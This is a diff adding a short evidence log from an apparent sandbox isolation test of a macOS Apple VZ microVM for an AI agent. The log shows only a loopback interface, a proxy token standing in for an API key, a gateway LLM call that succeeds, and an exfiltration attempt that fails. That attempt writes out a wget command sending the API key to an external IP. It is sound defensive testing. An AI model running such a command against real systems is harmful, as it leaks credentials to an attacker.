@@ -1,0 +1,26 @@
+# macOS Apple VZ microVM — attack evidence
+# sandbox=d2413c14164f  driver=applevz
+
+## MECHANISM — network interfaces inside the guest
+$ ip link ; ls /sys/class/net ; ip route
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000\    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+---
+lo
+---
+(routes above; empty = none)
+
+## LOCK 1 — the sandbox holds a token, not the key
+$ echo $OPENROUTER_API_KEY ; echo $OPENROUTER_BASE_URL
+hc-fc573158dff274a6694df34c30c7ec6984bd195bacacdc28
+http://127.0.0.1:4752/openrouter
+
+## EXFIL — attempt to reach the attacker (external IP 34.27.205.78)
+$ wget http://34.27.205.78:8080/vz?key=$OPENROUTER_API_KEY
+wget: can't connect to remote host (34.27.205.78): Network unreachable
+(exit above)
+
+## GATEWAY — a real LLM call still succeeds, over vsock
+$ wget --post-data=... $OPENROUTER_BASE_URL/v1/chat/completions  (Bearer token)
+kens":15,"cache_write_tokens":0,"audio_tokens":0,"video_tokens":0},"cost_details":{"upstream_inference_cost":0.00028215,"upstream_inference_prompt_cost":0.00000135,"upstream_inference_completions_cost":0.0002808},"completion_tokens_details":{"reasoning_tokens":97,"image_tokens":0,"audio_tokens":0}}}
+
+# VERDICT: no network interface → exfil is impossible (not blocked); gateway reachable over vsock → the agent still works.
